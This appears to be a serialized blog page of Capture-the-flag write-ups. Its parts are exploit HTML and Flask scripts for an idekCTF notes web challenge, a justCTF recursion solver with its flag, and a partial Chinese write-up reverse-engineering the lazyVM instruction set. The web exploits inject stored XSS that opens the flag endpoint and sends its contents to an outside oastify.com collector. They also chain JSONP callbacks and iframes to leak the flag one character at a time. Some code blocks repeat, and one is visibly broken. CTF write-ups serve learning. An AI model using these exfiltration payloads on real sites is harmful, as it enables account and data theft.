+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+1e:T17e3,<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
+    &lt;form method='POST' action='{{target}}/view.js'>
+    &lt;script>
+        document.forms[0].submit();
+    &lt;/script>
+<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> iframe2 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        iframe2<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23"</span><span class="token punctuation">;</span>
+        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> iframe3 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        iframe3<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23"</span><span class="token punctuation">;</span>
+        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+1f:Tc35,<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
+<span class="token keyword">import</span> requests
+
+target <span class="token operator">=</span> <span class="token string">"https://jnotes-web.chal.idek.team"</span>
+
+payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;img src=x onerror='
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+    const tab = window.open(`/api/flag`);
+    sleep(3000).then(() => fetch("//ta7dkoi5sodij8u1k6eft29ybphg56tv.oastify.com/?flag=" + tab.document.body.innerText));
+'>"""</span>
+
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">"/api/post"</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"noteContent"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"noteTitle"</span><span class="token punctuation">:</span> <span class="token string">"anything"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+note_id <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>note_id<span class="token punctuation">)</span>
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">"."</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> target<span class="token operator">=</span>target<span class="token punctuation">,</span> note_id<span class="token operator">=</span>note_id<span class="token punctuation">)</span>
+
+
+app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">5003</span><span class="token punctuation">)</span>
+20:T8ac,i <span class="token operator">=</span> <span class="token number">9</span>
+<span class="token comment"># {"flag":"idek{...}"}</span>
+<span class="token comment">#          ^</span>
+<span class="token comment">#         i=9</span>
+
+anchors <span class="token operator">=</span> <span class="token string">"\n"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>
+    <span class="token string-interpolation"><span class="token string">f'&lt;a id="</span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">" href="//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_</span><span class="token interpolation"><span class="token punctuation">{</span>i <span class="token operator">-</span> <span class="token number">9</span><span class="token punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">" target="_blank"></span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">&lt;/a>'</span></span>
+    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
+    &lt;iframe srcdoc='
+        </span><span class="token interpolation"><span class="token punctuation">{</span>anchors<span class="token punctuation">}</span></span><span class="token string">
+        &lt;script src="/api/view/anything?callback=window[top.opener.document.body.innerText[</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">]].click">&lt;/script>
+    '>&lt;/iframe>
+"""</span></span>
+21:T9b4,<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"{{target}}/note/{{note_id}}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"{{target}}/api/flag"</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+22:T12cc,<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
+<span class="token keyword">import</span> requests
+
+target <span class="token operator">=</span> <span class="token string">"https://jnotes-web.chal.idek.team"</span>
+
+i <span class="token operator">=</span> <span class="token number">9</span>
+<span class="token comment"># {"flag":"idek{...}"}</span>
+<span class="token comment">#          ^</span>
+<span class="token comment">#         i=9</span>
+
+anchors <span class="token operator">=</span> "
+
+    <span class="token string-interpolation"><span class="token string">f'&lt;a id="</span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">" href="//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_</span><span class="token interpolation"><span class="token punctuation">{</span>i <span class="token operator">-</span> <span class="token number">9</span><span class="token punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">" target="_blank"></span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">&lt;/a>'</span></span>
+    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
+    &lt;iframe srcdoc='
+        </span><span class="token interpolation"><span class="token punctuation">{</span>anchors<span class="token punctuation">}</span></span><span class="token string">
+        &lt;script src="/api/view/anything?callback=window[top.opener.document.body.innerText[</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">]].click">&lt;/script>
+    '>&lt;/iframe>
+"""</span></span>
+
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">"/api/post"</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"noteContent"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"noteTitle"</span><span class="token punctuation">:</span> <span class="token string">"anything"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+note_id <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>note_id<span class="token punctuation">)</span>
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">"."</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> target<span class="token operator">=</span>target<span class="token punctuation">,</span> note_id<span class="token operator">=</span>note_id<span class="token punctuation">)</span>
+
+
+app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">5003</span><span class="token punctuation">)</span>
+23:T466,from Crypto.Util.number import long_to_bytes
+
+A = 12871709638832864416674237492708808074465131233250468097567609804146306910998417223517320307084142930385333755674444057095681119233485961920941215894136808839080569675919567597231
+B = 805129649450289111374098215345043938348341847793365469885914570440914675704049341968773123354333661444680237475120349087680072042981825910641377252873686258216120616639500404381
+
+
+def F(x):
+    if x == 0:
+        return 2
+    elif x <= 1:
+        return 1
+    else:
+        result = x - 4 + (73 * x ** 5) + (8 * x ** 3) + G(x - 1)
+        return result
+
+
+def G(x):
+    if x <= 1:
+        return 1
+    else:
+        result = F(x - 1) + 3 * F(x - 2) - 5 * F(x - 3) + (3 * x ** 4)
+        return result
+
+
+fs = [F(0), F(1), F(2)]
+gs = [G(0), G(1), G(2)]
+
+for x in range(3, 13338):
+    gs.append(fs[x - 1] + 3 * fs[x - 2] - 5 * fs[x - 3] + (3 * x ** 4))
+    fs.append(x - 4 + (73 * x ** 5) + (8 * x ** 3) + gs[x - 1])
+
+print(F(9), fs[9])  # 6759072 6759072
+
+flag = fs[13337] % A + B
+print(long_to_bytes(flag).decode())
+
+# justCTF{1n_0rd3r_70_und3r574nd_r3cur510n_y0u_h4v3_t0_und3r574nd_r3cur510n}
+24:T21d6,<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes
+
+A <span class="token operator">=</span> <span class="token number">12871709638832864416674237492708808074465131233250468097567609804146306910998417223517320307084142930385333755674444057095681119233485961920941215894136808839080569675919567597231</span>
+B <span class="token operator">=</span> <span class="token number">805129649450289111374098215345043938348341847793365469885914570440914675704049341968773123354333661444680237475120349087680072042981825910641377252873686258216120616639500404381</span>
+
+
+<span class="token keyword">def</span> <span class="token function">F</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token number">2</span>
+    <span class="token keyword">elif</span> x <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token number">1</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        result <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">73</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> G<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> result
+
+
+<span class="token keyword">def</span> <span class="token function">G</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token number">1</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        result <span class="token operator">=</span> F<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> F<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> F<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">4</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> result
+
+
+fs <span class="token operator">=</span> <span class="token punctuation">[</span>F<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> F<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> F<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+gs <span class="token operator">=</span> <span class="token punctuation">[</span>G<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> G<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> G<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">13338</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fs<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> fs<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> fs<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    fs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">73</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> gs<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>F<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fs<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 6759072 6759072</span>
+
+flag <span class="token operator">=</span> fs<span class="token punctuation">[</span><span class="token number">13337</span><span class="token punctuation">]</span> <span class="token operator">%</span> A <span class="token operator">+</span> B
+<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># justCTF{1n_0rd3r_70_und3r574nd_r3cur510n_y0u_h4v3_t0_und3r574nd_r3cur510n}</span>
+5:[["$","h2",null,{"className":"x-h1","children":"idekCTF/rev/lazyVM"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"题目不给代码，只说flag在<code class=\"x-inline-highlight\">./flag.txt</code>，需要自己推出指令集，大概思路如下："}}],["$","h3",null,{"className":"x-h2","children":"utils"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"封装一个带有失败重试的请求函数<code class=\"x-inline-highlight\">send</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import functools\nimport socket\nimport time\n\n\ndef retry(max_retries=3):\n    def inner_decorator(func):\n        @functools.wraps(func)\n        def wrapper(*args):\n            retries = 0\n            while retries < max_retries:\n                try:\n                    return func(*args)\n                except Exception:\n                    retries += 1\n                    time.sleep(1)\n            return None\n\n        return wrapper\n\n    return inner_decorator\n\n\n@retry(max_retries=5)\ndef send(payload):\n    if isinstance(payload, str):\n        payload = payload.encode(\"latin1\")\n    assert isinstance(payload, bytes)\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(2)\n    s.connect((\"lazy-vm.chal.idek.team\", 1337))\n    s.recv(1024)\n    s.recv(1024)\n    s.send(payload + b\"\\n\")\n    result = s.recv(1024)\n    s.close()\n    return result.decode().strip()\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$f"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"枚举可用指令"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"一开始没什么思路所以给服务端发<code class=\"x-inline-highlight\">0</code>~<code class=\"x-inline-highlight\">255</code>的字节看看有什么回显，得到的信息是："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"\"0\": \"Thanks for playing\",\n\"1\": \"Thanks for playing\",\n\"2\": \"reg index out of range\",\n\"3\": \"reg index out of range\",\n\"4\": \"reg index out of range\",\n\"5\": \"reg index out of range\",\n\"6\": \"reg index out of range\",\n\"7\": \"Thanks for playing\",\n\"8\": \"Unknown instruction at ip=0x1\",\n\"9\": \"Unknown instruction at ip=0x0\",\n\"10\": \"Unknown instruction at ip=0x0\",\n...\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"\"0\": \"Thanks for playing\",\n\"1\": \"Thanks for playing\",\n\"2\": \"reg index out of range\",\n\"3\": \"reg index out of range\",\n\"4\": \"reg index out of range\",\n\"5\": \"reg index out of range\",\n\"6\": \"reg index out of range\",\n\"7\": \"Thanks for playing\",\n\"8\": \"Unknown instruction at ip=0x1\",\n\"9\": \"Unknown instruction at ip=0x0\",\n\"10\": \"Unknown instruction at ip=0x0\",\n...\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"说明<code class=\"x-inline-highlight\">\\x00</code>~<code class=\"x-inline-highlight\">\\x08</code>是有意义的指令；再后面就是<code class=\"x-inline-highlight\">i</code>指令可以打印当前虚拟机的状态："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"============== REGISTER ==================\nR0 = 0x0\nR1 = 0x0\nR2 = 0x0\nR3 = 0x0\nR4 = 0x0\nR5 = 0x0\nR6 = 0x0\nR7 = 0x0\nip: 0x0\nsp: 0x64\n=================== STACK =====================\n0x0\n0x0\n0x0\n0x0\n0x0\n=================== MEMORY =====================\nThe pay is only $5. Too lazy to implement this\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"============== REGISTER ==================\nR0 = 0x0\nR1 = 0x0\nR2 = 0x0\nR3 = 0x0\nR4 = 0x0\nR5 = 0x0\nR6 = 0x0\nR7 = 0x0\nip: 0x0\nsp: 0x64\n=================== STACK =====================\n0x0\n0x0\n0x0\n0x0\n0x0\n=================== MEMORY =====================\nThe pay is only $5. Too lazy to implement this\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"同时<code class=\"x-inline-highlight\">f</code><code class=\"x-inline-highlight\">l</code><code class=\"x-inline-highlight\">a</code><code class=\"x-inline-highlight\">g</code>四个字符不能出现在输入指令序列中，后面需要绕过。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"Found a forbidden character. Exit"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"Found a forbidden character. Exit"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"推断指令语法"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这一部分就比较有意思了，我测试了下面的输入的回显："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$10"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$11"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"注意到枚举可用指令这一步有些指令回显是<code class=\"x-inline-highlight\">reg index out of range</code>，说明有的指令的参数是寄存器编号。（实际上这里是把<code class=\"x-inline-highlight\">&#92;n</code>当做了参数，<code class=\"x-inline-highlight\">&#92;n</code>字节码是<code class=\"x-inline-highlight\">\\x0a</code>超过了寄存器数量所以报错了）"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这里已经意识到<code class=\"x-inline-highlight\">\\x00</code>可能是<code class=\"x-inline-highlight\">halt</code>指令，所以构造的<code class=\"x-inline-highlight\">8</code>个测试项都以<code class=\"x-inline-highlight\">\\x00</code>结尾。长度不同是考虑到可能有的指令接收两个参数，参数的值主要取小于等于<code class=\"x-inline-highlight\">7</code>和大于<code class=\"x-inline-highlight\">7</code>两种情况，为了测试哪些参数代表寄存器编号，哪些代表立即数。这些测试项的选取很主观，但也差不多够推断出指令集了。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"举几个例子："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">\\x00</code>回显均为<code class=\"x-inline-highlight\">Thanks for playing</code>，显然是结束符；"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">\\x01</code>回显中没有<code class=\"x-inline-highlight\">reg index out of range</code>，说明<code class=\"x-inline-highlight\">\\x01</code>的入参应该是立即数或地址；如果用<code class=\"x-inline-highlight\">i</code>打印信息，会发现数据被写进栈了，因此可以判断<code class=\"x-inline-highlight\">\\x01</code>指令是<code class=\"x-inline-highlight\">push (imm)</code>；"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">\\x02</code>和<code class=\"x-inline-highlight\">\\x03</code>的入参与寄存器编号有关，并且用<code class=\"x-inline-highlight\">i</code>打印信息发现<code class=\"x-inline-highlight\">sp</code>变了，判断分别是<code class=\"x-inline-highlight\">pop (Rx)</code>和<code class=\"x-inline-highlight\">push (Rx)</code>；"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">\\x06</code>和<code class=\"x-inline-highlight\">\\x07</code>，输入<code class=\"x-inline-highlight\">\\x06\\x00\\x00&#92;n</code>和<code class=\"x-inline-highlight\">\\x07\\x00\\x00&#92;n</code>都回显<code class=\"x-inline-highlight\">Unknown instruction at ip=0x3</code>，说明取指取到了<code class=\"x-inline-highlight\">&#92;n</code>，也就是这两个指令都需要两个操作数作为参数，从后几个测试项的报错可以看出<code class=\"x-inline-highlight\">\\x06</code>的第一个操作数是寄存器编号，而<code 